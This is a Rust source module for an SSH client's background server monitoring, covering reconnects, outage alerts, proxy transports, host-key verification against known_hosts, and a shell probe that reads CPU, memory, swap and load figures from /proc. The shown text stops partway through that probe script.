//! Lightweight, polling-based monitoring for saved nodes.
//!
//! Each monitored node owns a dedicated SSH session — separate from any
//! interactive session the user may have open. A per-node poller task wakes
//! every `INTERVAL_SECS`, runs a single composite script over an exec
//! channel, parses the output, and emits one `monitor-sample-{node_id}`
//! event with the resolved metrics. The frontend keeps a short ring buffer
//! per metric (~5 min) for sparklines.
//!
//! Scope deliberately kept small for V1:
//!   * No proxy support (direct TCP only)
//!   * No fingerprint prompt — host must already be in `known_hosts`
//!   * Six built-in metrics, no custom command support
//!   * One round-trip per poll (cheap on the server, low overhead)
//!
//! Anything more ambitious (proxies, custom metrics, fingerprint UX) is a
//! V2 concern and would be additive rather than restructuring this module.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use russh::client;
use russh::keys::PublicKeyOrCertificate;
use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter};
use tokio::io::AsyncReadExt;
use tokio::sync::{oneshot, Mutex};

// Defaults — overridable per-app via the `monitor_settings` table.
pub const DEFAULT_INTERVAL_SECS: u64 = 5;
pub const DEFAULT_CONNECT_TIMEOUT_SECS: u64 = 10;
pub const DEFAULT_POLL_TIMEOUT_SECS: u64 = 8;
pub const DEFAULT_OUTAGE_THRESHOLD: u32 = 3;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct MonitorSettings {
    /// Time between successful polls. Hot-applied — change takes effect on
    /// the next cycle of each poller.
    pub interval_secs: u64,
    /// Per-connect TCP / SSH timeout. Hot-applied for the next reconnect.
    pub connect_timeout_secs: u64,
    /// Per-poll exec timeout (how long we wait for the probe script's
    /// stdout to drain).
    pub poll_timeout_secs: u64,
    /// Consecutive failed polls before flagging a node as "outage". The
    /// outage event also fires through the existing app log so the user
    /// has a historical record.
    pub outage_threshold: u32,
    /// Whether to emit toast notifications on outage / recovery. When off,
    /// events are still logged but no toast is shown.
    pub notify_on_outage: bool,
    /// Whether to play an audible beep when a node crosses into outage.
    /// Independent of the visual toast — some users want one without the
    /// other. The frontend coalesces beeps via `beep_cooldown_secs` so a
    /// bulk drop (e.g. the entire fleet flapping at once) plays a single
    /// alert rather than spamming.
    #[serde(default = "default_false")]
    pub beep_on_outage: bool,
    /// Minimum seconds between consecutive beeps. The frontend rate-limits
    /// using this — any outage events landing inside the cooldown window
    /// are silently logged but don't play sound. Bumping this is the
    /// answer to "the alarm keeps screaming".
    #[serde(default = "default_beep_cooldown")]
    pub beep_cooldown_secs: u32,
}

// `#[serde(default = ...)]` attributes need a function reference, not a
// literal — these tiny helpers exist purely to satisfy that requirement
// while keeping the JSON migration story painless for users upgrading
// from a profile that doesn't have the new fields yet.
fn default_false() -> bool { false }
fn default_beep_cooldown() -> u32 { 10 }

impl Default for MonitorSettings {
    fn default() -> Self {
        Self {
            interval_secs: DEFAULT_INTERVAL_SECS,
            connect_timeout_secs: DEFAULT_CONNECT_TIMEOUT_SECS,
            poll_timeout_secs: DEFAULT_POLL_TIMEOUT_SECS,
            outage_threshold: DEFAULT_OUTAGE_THRESHOLD,
            notify_on_outage: true,
            beep_on_outage: false,
            beep_cooldown_secs: 10,
        }
    }
}

impl MonitorSettings {
    /// Clamp incoming user values to sane bounds so a typo can't break
    /// the poller (e.g. interval=0 spinning, or huge timeouts that hang
    /// the whole UI for minutes).
    pub fn sanitized(mut self) -> Self {
        self.interval_secs = self.interval_secs.clamp(1, 600);
        self.connect_timeout_secs = self.connect_timeout_secs.clamp(2, 120);
        self.poll_timeout_secs = self.poll_timeout_secs.clamp(2, 120);
        self.outage_threshold = self.outage_threshold.clamp(1, 100);
        // Cap the beep cooldown well above the polling interval so even a
        // typo can't disable the alarm entirely.
        self.beep_cooldown_secs = self.beep_cooldown_secs.clamp(0, 600);
        self
    }
}

pub type SharedSettings = Arc<Mutex<MonitorSettings>>;

// ---------------------------------------------------------------------------
// Shared state
// ---------------------------------------------------------------------------

/// One entry per monitored node. The `paused` flag is hot-toggleable from
/// the UI without restarting the poller. `stop_tx` is consumed once when
/// the monitor is removed; the poller task exits cleanly on receive.
pub struct MonitorEntry {
    pub node_id: i32,
    pub enabled_metrics: Arc<Mutex<Vec<String>>>,
    pub custom_metrics: Arc<Mutex<Vec<CustomMetric>>>,
    pub paused: Arc<Mutex<bool>>,
    pub state: Arc<Mutex<MonitorState>>,
    /// Wrapped in `Mutex<Option<...>>` so the sender can be `take()`-en
    /// from any holder (the entry is shared via `Arc` between the map
    /// and the spawned poller, so `Arc::try_unwrap` is unreliable). On
    /// `stop_monitor` we lock, take, and `send(())` — the poller's
    /// `tokio::select!` arm on `stop_rx` fires immediately and the
    /// task exits cleanly instead of hanging until the next interval.
    pub stop_tx: Mutex<Option<oneshot::Sender<()>>>,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct MonitorState {
    pub connected: bool,
    pub last_error: Option<String>,
    pub last_sample_ts: Option<u64>,
    /// Consecutive failed connect / poll attempts. Reset on every successful
    /// sample. Reaches `outage_threshold` → outage event fires.
    pub consecutive_failures: u32,
    /// `now_ms()` of the first failure in the current outage streak. None
    /// means "no active outage". Used both for the recovered-event payload
    /// (duration) and for the UI to show "offline for Xm".
    pub outage_since_ms: Option<u64>,
}

pub type MonitorMap = Arc<Mutex<HashMap<i32, Arc<MonitorEntry>>>>;

/// Live snapshot of one node as returned by `monitor_list`.
#[derive(Debug, Clone, Serialize)]
pub struct MonitorInfo {
    pub node_id: i32,
    pub enabled_metrics: Vec<String>,
    pub custom_metrics: Vec<CustomMetric>,
    pub paused: bool,
    pub connected: bool,
    pub last_error: Option<String>,
    pub last_sample_ts: Option<u64>,
    pub consecutive_failures: u32,
    pub outage_since_ms: Option<u64>,
}

#[derive(Debug, Clone, Serialize)]
pub struct Sample {
    pub node_id: i32,
    pub ts: u64,
    /// Map of metric_key → value. Net is reported as two synthetic keys
    /// ("net_in", "net_out") so the UI can render both as separate sparklines.
    /// Custom metrics with numeric `parse` mode show up here with their id.
    pub values: HashMap<String, f64>,
    /// Per-metric error string when a single metric failed to parse (e.g.
    /// `/proc/swaps` empty on a host with no swap). The connection may still
    /// be healthy.
    pub errors: HashMap<String, String>,
    /// Text-mode custom metrics — id → trimmed string. We don't push these
    /// into `values` because they're not numeric and don't go into the
    /// sparkline ring buffer.
    pub texts: HashMap<String, String>,
}

// ---------------------------------------------------------------------------
// Public spec passed in from the command layer. Decoupled from DB rows so
// callers can build it from anywhere.
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize)]
pub struct NodeAuth {
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: Option<String>,
    /// PEM-encoded private key body (already pulled from `ssh_keys` table by
    /// the caller) — and its optional passphrase.
    pub private_key: Option<String>,
    pub passphrase: Option<String>,
    /// "none", "socks5", or "http". Mirrors the interactive connect path so
    /// monitoring works through the same proxy the user configured for SSH.
    pub proxy_type: String,
    pub proxy_host: Option<String>,
    pub proxy_port: Option<u16>,
}

/// A user-defined metric. The probe loop wraps each command in BEGIN/END
/// markers so we can carve its output back out of the composite script's
/// single stdout stream — keeping us at one round-trip per poll cycle.
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct CustomMetric {
    /// Stable identifier used as the event key. Frontend generates it.
    pub id: String,
    pub name: String,
    /// Shell snippet, run under the login shell. Whatever it writes to
    /// stdout (and only stdout) lands in this metric's slice of the output.
    pub command: String,
    /// "number" (first numeric token), "regex" (first capture group as
    /// number), "text" (raw trimmed stdout).
    pub parse: String,
    /// Only consulted when parse=="regex".
    #[serde(default)]
    pub regex: Option<String>,
    /// Display hint for the frontend — "sparkline", "big_number", "text".
    pub display: String,
    /// Optional unit suffix shown after the number.
    #[serde(default)]
    pub unit: Option<String>,
}

// ---------------------------------------------------------------------------
// Public entry points
// ---------------------------------------------------------------------------

/// Start (or resume) monitoring a node. Spawns the poller task and stashes
/// the entry in the map. Returns immediately — the connect happens inside
/// the spawned task so a slow / unreachable host doesn't block the caller.
pub async fn start_monitor(
    app: AppHandle,
    map: MonitorMap,
    db: Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    settings: SharedSettings,
    node_id: i32,
    node_name: String,
    auth: NodeAuth,
    enabled_metrics: Vec<String>,
    custom_metrics: Vec<CustomMetric>,
    paused: bool,
) {
    // If a poller already exists for this node, stop it first so we never
    // double-poll.
    let existing = map.lock().await.remove(&node_id);
    if let Some(prev) = existing {
        if let Some(tx) = prev.stop_tx.lock().await.take() {
            let _ = tx.send(());
        }
    }

    let (stop_tx, stop_rx) = oneshot::channel::<()>();
    let entry = Arc::new(MonitorEntry {
        node_id,
        enabled_metrics: Arc::new(Mutex::new(enabled_metrics)),
        custom_metrics: Arc::new(Mutex::new(custom_metrics)),
        paused: Arc::new(Mutex::new(paused)),
        state: Arc::new(Mutex::new(MonitorState::default())),
        stop_tx: Mutex::new(Some(stop_tx)),
    });

    map.lock().await.insert(node_id, Arc::clone(&entry));

    let app_for_task = app.clone();
    let entry_for_task = Arc::clone(&entry);
    tauri::async_runtime::spawn(async move {
        run_poller(app_for_task, entry_for_task, db, settings, node_name, auth, stop_rx).await;
    });
}

pub async fn stop_monitor(map: MonitorMap, node_id: i32) {
    let removed = map.lock().await.remove(&node_id);
    if let Some(arc_entry) = removed {
        // Take the sender out of the Option and signal the poller.
        // The poller's `tokio::select!` arm on `stop_rx` fires within
        // the same tick — no waiting for the next interval like the
        // previous "paused=true and hope" pattern.
        if let Some(tx) = arc_entry.stop_tx.lock().await.take() {
            let _ = tx.send(());
        }
        // Also flip paused so any in-flight loop iteration short-circuits
        // before the select arm has a chance to run.
        *arc_entry.paused.lock().await = true;
    }
}

pub async fn set_paused(map: MonitorMap, node_id: i32, paused: bool) -> Result<(), String> {
    let entry = map
        .lock()
        .await
        .get(&node_id)
        .cloned()
        .ok_or_else(|| format!("服务器 {} 未被监控", node_id))?;
    *entry.paused.lock().await = paused;
    Ok(())
}

pub async fn set_enabled_metrics(
    map: MonitorMap,
    node_id: i32,
    metrics: Vec<String>,
) -> Result<(), String> {
    let entry = map
        .lock()
        .await
        .get(&node_id)
        .cloned()
        .ok_or_else(|| format!("服务器 {} 未被监控", node_id))?;
    *entry.enabled_metrics.lock().await = metrics;
    Ok(())
}

pub async fn set_custom_metrics(
    map: MonitorMap,
    node_id: i32,
    metrics: Vec<CustomMetric>,
) -> Result<(), String> {
    let entry = map
        .lock()
        .await
        .get(&node_id)
        .cloned()
        .ok_or_else(|| format!("服务器 {} 未被监控", node_id))?;
    *entry.custom_metrics.lock().await = metrics;
    Ok(())
}

pub async fn list(map: MonitorMap) -> Vec<MonitorInfo> {
    let map = map.lock().await;
    let mut out = Vec::with_capacity(map.len());
    for entry in map.values() {
        out.push(entry_status(entry).await);
    }
    out
}

pub async fn pause_all(map: MonitorMap) {
    let snap: Vec<Arc<MonitorEntry>> = map.lock().await.values().cloned().collect();
    for e in snap {
        *e.paused.lock().await = true;
    }
}

async fn entry_status(entry: &MonitorEntry) -> MonitorInfo {
    let metrics = entry.enabled_metrics.lock().await.clone();
    let customs = entry.custom_metrics.lock().await.clone();
    let paused = *entry.paused.lock().await;
    let s = entry.state.lock().await;
    MonitorInfo {
        node_id: entry.node_id,
        enabled_metrics: metrics,
        custom_metrics: customs,
        paused,
        connected: s.connected,
        last_error: s.last_error.clone(),
        last_sample_ts: s.last_sample_ts,
        consecutive_failures: s.consecutive_failures,
        outage_since_ms: s.outage_since_ms,
    }
}

// ---------------------------------------------------------------------------
// Poller loop
// ---------------------------------------------------------------------------

async fn run_poller(
    app: AppHandle,
    entry: Arc<MonitorEntry>,
    db: Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    settings: SharedSettings,
    node_name: String,
    auth: NodeAuth,
    mut stop_rx: oneshot::Receiver<()>,
) {
    let node_id = entry.node_id;
    let mut last: Option<RawSnapshot> = None;
    let mut handle: Option<russh::client::Handle<MonitorHandler>> = None;
    let mut backoff = Duration::from_secs(2);
    let backoff_max = Duration::from_secs(60);

    // Helper: record a failure, fire outage event if we just crossed the
    // threshold. Caller still has the responsibility to surface the actual
    // error to the user via mark_disconnected.
    async fn record_failure(
        app: &AppHandle,
        entry: &MonitorEntry,
        node_name: &str,
        threshold: u32,
        err: &str,
        notify: bool,
        beep: bool,
    ) {
        let (just_crossed, since_ms) = {
            let mut s = entry.state.lock().await;
            s.consecutive_failures = s.consecutive_failures.saturating_add(1);
            if s.outage_since_ms.is_none() {
                s.outage_since_ms = Some(now_ms());
            }
            let crossed = s.consecutive_failures == threshold;
            (crossed, s.outage_since_ms.unwrap_or_else(now_ms))
        };
        if just_crossed {
            // Outage event: one-shot per outage streak. The frontend toasts
            // it (when notify=true), logs it always, and the card shows a
            // persistent "Offline for Xm" badge. `beep` is a hint — the
            // frontend still applies its own cooldown to collapse bursts.
            let _ = app.emit(
                &format!("monitor-outage-{}", entry.node_id),
                serde_json::json!({
                    "node_id": entry.node_id,
                    "node_name": node_name,
                    "since_ms": since_ms,
                    "consecutive_failures": threshold,
                    "last_error": err,
                    "notify": notify,
                    "beep": beep,
                }),
            );
        }
    }

    // Recovery event: one-shot when we go from outage_since=Some → None.
    async fn record_recovery(
        app: &AppHandle,
        entry: &MonitorEntry,
        node_name: &str,
        notify: bool,
        was_outage_threshold: bool,
    ) {
        let (was_outage, since_ms, duration_ms) = {
            let mut s = entry.state.lock().await;
            let was = s.outage_since_ms.is_some();
            let since = s.outage_since_ms;
            s.consecutive_failures = 0;
            s.outage_since_ms = None;
            let duration = since.map(|t| now_ms().saturating_sub(t)).unwrap_or(0);
            (was, since.unwrap_or(0), duration)
        };
        if was_outage && was_outage_threshold {
            let _ = app.emit(
                &format!("monitor-recovered-{}", entry.node_id),
                serde_json::json!({
                    "node_id": entry.node_id,
                    "node_name": node_name,
                    "since_ms": since_ms,
                    "duration_ms": duration_ms,
                    "notify": notify,
                }),
            );
        }
    }

    loop {
        // Record the deadline BEFORE running the poll. If the poll
        // takes longer than `interval` we want the next tick to fire
        // immediately (catching up), not to drift by the cost of the
        // slow poll. Equivalent to tokio::time::interval with
        // MissedTickBehavior::Delay, but resilient to mid-flight
        // interval changes from hot-applied settings.
        let tick_started_at = std::time::Instant::now();

        // 1) Honour stop / pause / removal.
        if stop_rx.try_recv().is_ok() {
            break;
        }
        if Arc::strong_count(&entry) == 1 {
            break;
        }
        if *entry.paused.lock().await {
            mark_disconnected(&app, &entry, None).await;
            handle = None;
            // Pause should NOT count as outage: clear streak so a resume
            // doesn't instantly fire a recovered event.
            {
                let mut s = entry.state.lock().await;
                s.consecutive_failures = 0;
                s.outage_since_ms = None;
            }
            tokio::select! {
                _ = &mut stop_rx => break,
                _ = tokio::time::sleep(Duration::from_secs(1)) => continue,
            }
        }

        // 2) Pull current settings (hot-applied each cycle).
        let cfg = settings.lock().await.clone();
        let threshold = cfg.outage_threshold;
        let notify = cfg.notify_on_outage;
        let beep = cfg.beep_on_outage;
        let connect_timeout = Duration::from_secs(cfg.connect_timeout_secs);
        let poll_timeout = Duration::from_secs(cfg.poll_timeout_secs);
        let interval = Duration::from_secs(cfg.interval_secs);

        // 3) Ensure we have a live SSH handle.
        if handle.as_ref().map(|h| h.is_closed()).unwrap_or(true) {
            match connect_for_monitor(&db, &auth, connect_timeout).await {
                Ok(h) => {
                    handle = Some(h);
                    backoff = Duration::from_secs(2);
                    let was_outage_threshold = {
                        let s = entry.state.lock().await;
                        s.consecutive_failures >= threshold
                    };
                    record_recovery(&app, &entry, &node_name, notify, was_outage_threshold).await;
                    mark_connected(&app, &entry).await;
                    // Reset differential baseline so the first sample after
                    // reconnect doesn't produce a giant nonsense CPU/net spike.
                    last = None;
                }
                Err(e) => {
                    record_failure(&app, &entry, &node_name, threshold, &e, notify, beep).await;
                    mark_disconnected(&app, &entry, Some(e)).await;
                    tokio::select! {
                        _ = &mut stop_rx => break,
                        _ = tokio::time::sleep(backoff) => {}
                    }
                    backoff = (backoff * 2).min(backoff_max);
                    continue;
                }
            }
        }

        // 4) Poll once. Snapshot enabled + custom lists here so mid-cycle
        // hot-updates from the UI take effect on the NEXT cycle.
        let customs_snap: Vec<CustomMetric> = entry.custom_metrics.lock().await.clone();
        let h = handle.as_ref().unwrap();
        match poll_once(h, &customs_snap, poll_timeout).await {
            Ok(raw) => {
                let enabled_snap = entry.enabled_metrics.lock().await.clone();
                let sample = compute_sample(node_id, &raw, &last, &enabled_snap, &customs_snap);
                last = Some(raw);
                {
                    let mut s = entry.state.lock().await;
                    s.last_sample_ts = Some(sample.ts);
                    s.connected = true;
                    s.last_error = None;
                }
                let was_outage_threshold = {
                    let s = entry.state.lock().await;
                    s.consecutive_failures >= threshold
                };
                record_recovery(&app, &entry, &node_name, notify, was_outage_threshold).await;
                let _ = app.emit(&format!("monitor-sample-{}", node_id), sample);
            }
            Err(e) => {
                eprintln!("[monitor] poll failed for node {}: {}", node_id, e);
                handle = None;
                record_failure(&app, &entry, &node_name, threshold, &e, notify, beep).await;
                mark_disconnected(&app, &entry, Some(e)).await;
            }
        }

        // 5) Wait until the deadline computed at the START of this
        // iteration. A poll that overran `interval` sleeps zero and
        // the next tick fires immediately — drift bounded to one
        // interval regardless of how slow a single probe gets.
        let now = std::time::Instant::now();
        let next_tick = tick_started_at + interval;
        let wait = if next_tick > now { next_tick - now } else { Duration::ZERO };
        tokio::select! {
            _ = &mut stop_rx => break,
            _ = tokio::time::sleep(wait) => {}
        }
    }

    mark_disconnected(&app, &entry, None).await;
}

async fn mark_connected(app: &AppHandle, entry: &MonitorEntry) {
    {
        let mut s = entry.state.lock().await;
        s.connected = true;
        s.last_error = None;
    }
    let _ = app.emit(
        &format!("monitor-status-{}", entry.node_id),
        entry_status(entry).await,
    );
}

async fn mark_disconnected(app: &AppHandle, entry: &MonitorEntry, err: Option<String>) {
    let already = {
        let s = entry.state.lock().await;
        !s.connected && s.last_error == err
    };
    if already {
        return; // avoid spamming identical status events
    }
    {
        let mut s = entry.state.lock().await;
        s.connected = false;
        s.last_error = err;
    }
    let _ = app.emit(
        &format!("monitor-status-{}", entry.node_id),
        entry_status(entry).await,
    );
}

// ---------------------------------------------------------------------------
// SSH connect (minimal, no proxy)
// ---------------------------------------------------------------------------

/// Tiny handler that only authorises hosts whose fingerprint is already in
/// `known_hosts`. There's no UI plumbing here — for V1 the user must have
/// connected interactively at least once so the fingerprint is approved.
pub struct MonitorHandler {
    db: Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    host: String,
    port: u16,
}

impl client::Handler for MonitorHandler {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        offered: &PublicKeyOrCertificate,
    ) -> Result<bool, Self::Error> {
        // Host certificates are refused (no CA trust store) — same policy as
        // the interactive ClientHandler; see ssh_manager::plain_host_key.
        let Some(server_public_key) = crate::ssh_manager::plain_host_key(offered) else {
            eprintln!(
                "[monitor] {}:{} presented a host certificate; certificates can't be verified (no trusted CA), refusing",
                self.host, self.port
            );
            return Ok(false);
        };
        // Must be byte-identical to what the interactive path stored in
        // known_hosts — this handler only trusts fingerprints already on file,
        // matched by fingerprint alone (the key identity), so the RSA key_type
        // spelling change between russh versions is moot here.
        let fp = crate::ssh_manager::host_key_fingerprint(server_public_key);
        let mut ok = false;
        if let Ok(guard) = self.db.lock() {
            if let Some(conn) = guard.as_ref() {
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT 1 FROM known_hosts WHERE host=?1 AND port=?2 AND fingerprint=?3",
                ) {
                    if let Ok(mut rows) = stmt.query(rusqlite::params![self.host, self.port, fp]) {
                        if let Ok(Some(_)) = rows.next() {
                            ok = true;
                        }
                    }
                }
            }
        }
        Ok(ok)
    }
}

/// Trait-object wrapper so we can hand russh's `connect_stream` either a
/// direct TcpStream, a tokio_socks SOCKS5 stream, or a CONNECT-tunneled
/// TcpStream — depending on the node's proxy config — via the same path.
trait AsyncStream: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send + 'static {}
impl<T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send + 'static> AsyncStream for T {}

struct StreamBox(Box<dyn AsyncStream>);
impl tokio::io::AsyncRead for StreamBox {
    fn poll_read(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &mut tokio::io::ReadBuf<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut *self.0).poll_read(cx, buf)
    }
}
impl tokio::io::AsyncWrite for StreamBox {
    fn poll_write(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &[u8],
    ) -> std::task::Poll<std::io::Result<usize>> {
        std::pin::Pin::new(&mut *self.0).poll_write(cx, buf)
    }
    fn poll_flush(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut *self.0).poll_flush(cx)
    }
    fn poll_shutdown(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut *self.0).poll_shutdown(cx)
    }
}

/// Build the underlying transport, honouring the node's proxy settings.
/// Same matrix as the interactive connect path, kept narrow to the three
/// kinds we already support there.
async fn open_transport(auth: &NodeAuth, connect_timeout: Duration) -> Result<Box<dyn AsyncStream>, String> {
    match auth.proxy_type.as_str() {
        "socks5" => {
            let p_host = auth.proxy_host.as_deref().filter(|s| !s.is_empty())
                .ok_or("SOCKS5 proxy host is empty")?;
            let p_port = auth.proxy_port.unwrap_or(1080);
            let proxy_addr = format!("{}:{}", p_host, p_port);
            let stream = tokio::time::timeout(
                connect_timeout,
                tokio_socks::tcp::Socks5Stream::connect(proxy_addr.as_str(), (auth.host.as_str(), auth.port)),
            )
            .await
            .map_err(|_| format!("SOCKS5 proxy {} timed out", proxy_addr))?
            .map_err(|e| format!("SOCKS5: {}", e))?;
            Ok(Box::new(stream))
        }
        "http" => {
            let p_host = auth.proxy_host.as_deref().filter(|s| !s.is_empty())
                .ok_or("HTTP proxy host is empty")?;
            let p_port = auth.proxy_port.unwrap_or(8080);
            let proxy_addr = format!("{}:{}", p_host, p_port);
            let mut tcp = tokio::time::timeout(
                connect_timeout,
                tokio::net::TcpStream::connect(proxy_addr.as_str()),
            )
            .await
            .map_err(|_| format!("HTTP proxy {} timed out", proxy_addr))?
            .map_err(|e| format!("HTTP proxy TCP: {}", e))?;
            let _ = tcp.set_nodelay(true);
            tokio::time::timeout(
                connect_timeout,
                async_http_proxy::http_connect_tokio(&mut tcp, &auth.host, auth.port),
            )
            .await
            .map_err(|_| format!("HTTP CONNECT to {}:{} timed out", auth.host, auth.port))?
            .map_err(|e| format!("HTTP CONNECT: {}", e))?;
            Ok(Box::new(tcp))
        }
        _ => {
            let stream = tokio::time::timeout(
                connect_timeout,
                tokio::net::TcpStream::connect((auth.host.as_str(), auth.port)),
            )
            .await
            .map_err(|_| format!("TCP connect to {}:{} timed out", auth.host, auth.port))?
            .map_err(|e| format!("TCP: {}", e))?;
            let _ = stream.set_nodelay(true);
            Ok(Box::new(stream))
        }
    }
}

/// Decide what auth methods are actually usable from the resolved `NodeAuth`.
/// A vault entry of type "key" yields `(key_pem, passphrase)`; a "password"
/// vault entry yields `password`. We compute this once and present clear
/// errors when the entry is somehow malformed (empty key body, etc.).
fn classify_auth(auth: &NodeAuth) -> Result<(Option<(String, Option<String>)>, Option<String>), String> {
    let key = auth
        .private_key
        .as_ref()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .map(|pem| (pem, auth.passphrase.clone()));
    let pass = auth
        .password
        .as_ref()
        .filter(|p| !p.is_empty())
        .cloned();
    if key.is_none() && pass.is_none() {
        // A node saved without its password is asked for it at connect time
        // (issue #30), but monitoring has no UI to ask on.
        return Err(
            "No saved password or key for this node — monitoring can't ask for one; save the password to monitor it".into(),
        );
    }
    Ok((key, pass))
}

/// russh client config for monitor connections. The algorithm lists and the
/// DH group-exchange bounds come from the SAME functions as the interactive
/// session's (`crate::build_ssh_client_config`), so the monitor negotiates the
/// same host-key type whose fingerprint that session stored and approved.
/// russh's default list would not: it prefers ECDSA P-384 / P-521 host keys
/// over RSA (a fingerprint nobody approved → the monitor refuses the host)
/// and drops the legacy algorithms older servers need.
fn monitor_client_config() -> client::Config {
    let mut config = client::Config::default();
    config.keepalive_interval = Some(Duration::from_secs(30));
    // No keepalive-count disconnect (russh's default of 3 drops a quiet
    // connection after ~2 min of server silence): each poll has its own
    // timeout, and a failed poll drops the handle and reconnects.
    config.keepalive_max = 0;
    config.preferred = crate::ssh_preferred_algorithms();
    config.gex = crate::ssh_gex_params();
    config
}

async fn connect_for_monitor(
    db: &Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    auth: &NodeAuth,
    connect_timeout: Duration,
) -> Result<russh::client::Handle<MonitorHandler>, String> {
    if auth.username.trim().is_empty() {
        // A node saved without a username is asked "Login as" when a terminal
        // connects (issue #54); monitoring can't ask, and falling back to root
        // would send this node's password to the wrong account.
        return Err(
            "No username is saved for this node — monitoring can't ask for one; save the username to monitor it".into(),
        );
    }
    let (key_pair, password) = classify_auth(auth)?;

    // Asks the host for the kinds of host key on file for it first, as the
    // session does, so both negotiate the key that's trusted.
    let mut config = monitor_client_config();
    if let Ok(guard) = db.lock() {
        if let Some(conn) = guard.as_ref() {
            let families = crate::ssh_manager::known_host_families(conn, &auth.host, auth.port);
            crate::prefer_known_host_keys(&mut config.preferred, &families);
        }
    }
    let config = Arc::new(config);

    let handler = MonitorHandler {
        db: Arc::clone(db),
        host: auth.host.clone(),
        port: auth.port,
    };

    let transport = open_transport(auth, connect_timeout).await?;
    // Handshake budget mirrors the interactive path. We don't expose it
    // separately in settings; it's bounded by `connect_timeout` * 2 so very
    // chatty hosts (algorithm negotiation through a slow proxy) still get
    // a fair shake without hanging the UI.
    let handshake_budget = connect_timeout * 2;
    let mut session = tokio::time::timeout(
        handshake_budget,
        client::connect_stream(config, StreamBox(transport), handler),
    )
    .await
    .map_err(|_| format!("SSH handshake to {}:{} timed out", auth.host, auth.port))?
    .map_err(|e| format!("SSH connect: {}", e))?;

    // Auth order: try key first (more secure), only fall back to password
    // if key auth wasn't possible (no key in entry) or russh signalled
    // "method failed but server said try another". We DO NOT silently fall
    // back from a rejected key to password — that would risk leaking the
    // password to a server the user explicitly chose key auth for.
    let mut last_err: Option<String> = None;
    let mut accepted = false;

    if let Some((pem, passphrase)) = key_pair.as_ref() {
        match crate::decode_private_key(pem, passphrase.as_deref()) {
            Ok(kp) => {
                match crate::ssh_manager::authenticate_with_key(&mut session, &auth.username, kp)
                    .await
                {
                    Ok(true) => accepted = true,
                    Ok(false) => last_err = Some(format!(
                        "publickey auth rejected by {}@{}",
                        auth.username, auth.host,
                    )),
                    Err(e) => last_err = Some(format!("publickey: {}", e)),
                }
            }
            // Monitoring has no UI to prompt on (issue #30), so a key that needs
            // a passphrase we don't have is a clear, actionable error — not a
            // hang. The user saves the passphrase on the key to monitor it.
            Err(crate::KeyDecodeError::NeedsPassphrase) => {
                let saved = passphrase.as_deref().is_some_and(|p| !p.is_empty());
                last_err = Some(if saved {
                    format!(
                        "the saved passphrase doesn't unlock the SSH key for {}@{}",
                        auth.username, auth.host,
                    )
                } else {
                    format!(
                        "the SSH key for {}@{} is passphrase-protected but no passphrase is saved; monitoring can't ask for one — save it under Settings › SSH keys",
                        auth.username, auth.host,
                    )
                });
            }
            Err(crate::KeyDecodeError::Malformed(m)) => {
                last_err = Some(format!("could not decode private key: {}", m));
            }
        }
    }

    // Try password only if key wasn't configured at all. If key was
    // configured but rejected, surface that — see comment above.
    if !accepted && key_pair.is_none() {
        if let Some(p) = password.as_ref() {
            match crate::ssh_manager::authenticate_with_password(&mut session, &auth.username, p).await {
                Ok(true) => accepted = true,
                Ok(false) => last_err = Some(format!(
                    "password auth rejected by {}@{}",
                    auth.username, auth.host,
                )),
                Err(e) => last_err = Some(format!("password: {}", e)),
            }
        }
    }

    if !accepted {
        return Err(last_err.unwrap_or_else(|| "auth failed".into()));
    }
    Ok(session)
}

// ---------------------------------------------------------------------------
// Polling: one composite script per cycle
// ---------------------------------------------------------------------------

/// Header lines for the built-in probe. Designed to run on the broadest
/// possible set of Linux distros — Debian/Ubuntu, RHEL/Fedora, Alpine
/// (busybox sh + busybox awk), embedded boxes with kernels predating
/// MemAvailable (~3.14), and minimal containers with only `/proc` mounted.
///
/// Tag-prefixed lines (`CPU …`, `MEM …` etc.) survive any MOTD or
/// shell-init noise the parser would otherwise have to filter. Each
/// command is wrapped to swallow stderr so a missing tool surfaces as a
/// missing tag in the parser (cleanly degraded) rather than a torrent of
/// "command not found" lines.
///
/// Only POSIX shell features + plain `awk` are used — no bash-isms, no
/// gawk extensions (`gensub`, length-of-array, etc.). Confirmed against
/// busybox 1.36 awk.
const BUILTIN_PROBE: &str = r#"
echo CPU $(awk '/^cpu /{print $2,$3,$4,$5,$6,$7,$8,$9}' /proc/stat 2>/dev/null)
echo MEM $(awk '
  /^MemTotal:/   {t=$2}
  /^MemAvailable:/ {a=$2; ok=1}
  /^MemFree:/    {f=$2}
  /^Buffers:/    {b=$2}
  /^Cached:/     {c=$2}
  END {
    # Kernels >= 3.14 have MemAvailable — use it directly. Older kernels
    # only have MemFree, so approximate "available" as Free + Buffers +
    # reclaimable Cached. Slightly optimistic but the best we can do.
    if (ok) print t, a; else print t+0, (f+b+c)+0
  }
' /proc/meminfo 2>/dev/null)
echo SWAP $(awk '
  /^SwapTotal:/{t=$2} /^SwapFree:/{f=$2}
  END {print t+0, f+0}
' /proc/meminfo 2>/dev/null)
echo LOAD $(awk '{print $1; exit}' /proc/loadavg 2>/dev/null)
